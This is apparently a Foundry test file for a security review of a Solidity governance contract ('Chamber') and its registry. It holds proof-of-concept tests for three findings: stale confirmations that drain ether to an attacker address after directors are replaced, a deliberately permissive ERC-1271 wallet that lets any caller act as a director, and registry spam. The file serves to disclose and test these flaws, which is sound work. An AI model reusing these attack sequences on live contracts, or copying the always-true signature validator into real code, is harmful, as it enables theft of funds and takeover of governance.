// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test, console} from "forge-std/Test.sol";
import {Chamber} from "src/Chamber.sol";
import {IChamber} from "src/interfaces/IChamber.sol";
import {IWallet} from "src/interfaces/IWallet.sol";
import {IERC1271} from "lib/openzeppelin-contracts/contracts/interfaces/IERC1271.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "test/mock/MockERC20.sol";
import {MockERC721} from "test/mock/MockERC721.sol";
import {DeployChamber} from "test/utils/DeployChamber.sol";
import {Registry} from "src/Registry.sol";
import {DeployRegistry} from "test/utils/DeployRegistry.sol";

/// @dev ERC-1271 wallet that approves ANY hash/signature (intentionally weak)
contract PermissiveERC1271Wallet {
    function isValidSignature(bytes32, bytes memory) external pure returns (bytes4) {
        return IERC1271.isValidSignature.selector;
    }
}

/// @dev Tests for offensive-review findings (stale confirmations, ERC1271, registry spam)
contract OffensiveReviewFindingsTest is Test {
    Chamber public chamber;
    MockERC20 public token;
    MockERC721 public nft;

    address public user1 = address(0x1);
    address public user2 = address(0x2);
    address public user3 = address(0x3);
    address public attacker = address(0xBEEF);

    uint256 public constant SEATS = 5;

    function setUp() public {
        token = new MockERC20("Mock Token", "MCK", 100_000_000e18);
        nft = new MockERC721("Mock NFT", "MNFT");
        chamber = DeployChamber.deploy(address(token), address(nft), SEATS, "vERC20", "VLT", address(0x9));
    }

    function _setupInitialDirectors() internal {
        MockERC721(address(nft)).mintWithTokenId(user1, 1);
        MockERC721(address(nft)).mintWithTokenId(user2, 2);
        MockERC721(address(nft)).mintWithTokenId(user3, 3);

        uint256 small = 1;
        _depositAndDelegate(user1, 1, small);
        _depositAndDelegate(user2, 2, small);
        _depositAndDelegate(user3, 3, small);
    }

    function _depositAndDelegate(address user, uint256 tokenId, uint256 amount) internal {
        MockERC20(address(token)).mint(user, amount);
        vm.startPrank(user);
        token.approve(address(chamber), amount);
        chamber.deposit(amount, user);
        chamber.delegate(tokenId, amount);
        vm.stopPrank();
    }

    function _isDirectorToken(uint256 tokenId) internal view returns (bool) {
        (uint256[] memory topIds,) = chamber.getTop(SEATS);
        for (uint256 i = 0; i < topIds.length; i++) {
            if (topIds[i] == tokenId) return true;
        }
        return false;
    }

    /// Finding 1: confirmations from former directors still enable execution
    function test_Finding1_StaleConfirmations_ExecuteAfterDirectorTurnover() public {
        _setupInitialDirectors();

        assertTrue(_isDirectorToken(1));
        assertTrue(_isDirectorToken(2));
        assertTrue(_isDirectorToken(3));

        uint256 quorum = chamber.getQuorum(); // seats=5 => 1 + 255/100 = 3
        assertEq(quorum, 3);

        deal(address(chamber), 1 ether);

        vm.prank(user1);
        chamber.submitTransaction(1, attacker, 1 ether, "");

        vm.prank(user2);
        chamber.confirmTransaction(2, 0);
        vm.prank(user3);
        chamber.confirmTransaction(3, 0);

        (bool executed, uint8 confirmations,,,) = chamber.getTransaction(0);
        assertFalse(executed);
        assertEq(confirmations, 3);

        // New holders out-delegate and take all top seats, evicting 1/2/3
        address user4 = address(0x4);
        address user5 = address(0x5);
        address user6 = address(0x6);
        address user7 = address(0x7);
        address user8 = address(0x8);

        MockERC721(address(nft)).mintWithTokenId(user4, 4);
        MockERC721(address(nft)).mintWithTokenId(user5, 5);
        MockERC721(address(nft)).mintWithTokenId(user6, 6);
        MockERC721(address(nft)).mintWithTokenId(user7, 7);
        MockERC721(address(nft)).mintWithTokenId(user8, 8);

        uint256 large = 1000 ether;
        _depositAndDelegate(user4, 4, large);
        _depositAndDelegate(user5, 5, large);
        _depositAndDelegate(user6, 6, large);
        _depositAndDelegate(user7, 7, large);
        _depositAndDelegate(user8, 8, large);

        assertFalse(_isDirectorToken(1), "token 1 should no longer be in top seats");
        assertFalse(_isDirectorToken(2), "token 2 should no longer be in top seats");
        assertFalse(_isDirectorToken(3), "token 3 should no longer be in top seats");
        assertTrue(_isDirectorToken(4), "token 4 should be current director");

        uint256 attackerBefore = attacker.balance;

        // Current director executes; confirmers (1,2,3) are no longer directors
        vm.prank(user4);
        chamber.executeTransaction(4, 0, "");

        assertEq(attacker.balance, attackerBefore + 1 ether, "stale confirmations allowed fund drain");
        (executed,,,,) = chamber.getTransaction(0);
        assertTrue(executed);
    }

    /// Finding 2: permissive ERC-1271 owner contract grants director rights to any caller
    function test_Finding2_PermissiveERC1271_AnyCallerActsAsDirector() public {
        PermissiveERC1271Wallet wallet = new PermissiveERC1271Wallet();
        uint256 tokenId = 99;
        MockERC721(address(nft)).mintWithTokenId(address(wallet), tokenId);

        uint256 amount = 100 ether;
        MockERC20(address(token)).mint(address(this), amount);
        token.approve(address(chamber), amount);
        chamber.deposit(amount, address(this));
        chamber.delegate(tokenId, amount);

        assertTrue(_isDirectorToken(tokenId));

        address randomCaller = address(0xDEAD);
        vm.prank(randomCaller);
        chamber.submitTransaction(tokenId, address(0x9999), 0, "");

        assertEq(chamber.getTransactionCount(), 1, "permissive ERC1271 let non-owner act as director");
    }

    /// Finding 3: anyone can spam chamber creation (griefing / indexing bloat)
    function test_Finding3_PermissionlessCreateChamber_SpamSucceeds() public {
        Registry registry = DeployRegistry.deploy(address(this));
        MockERC20 spamToken = new MockERC20("Spam", "SPAM", 1e18);
        MockERC721 spamNft = new MockERC721("Spam NFT", "SNFT");

        uint256 countBefore = registry.getChamberCount();
        uint256 spamCount = 25;

        for (uint256 i = 0; i < spamCount; i++) {
            registry.createChamber(address(spamToken), address(spamNft), 5, "Spam", "SPM");
        }

        assertEq(registry.getChamberCount(), countBefore + spamCount);
        assertTrue(registry.isChamber(registry.getAllChambers()[countBefore + spamCount - 1]));

        address[] memory byAsset = registry.getChambersByAsset(address(spamToken));
        assertEq(byAsset.length, spamCount);
    }
}
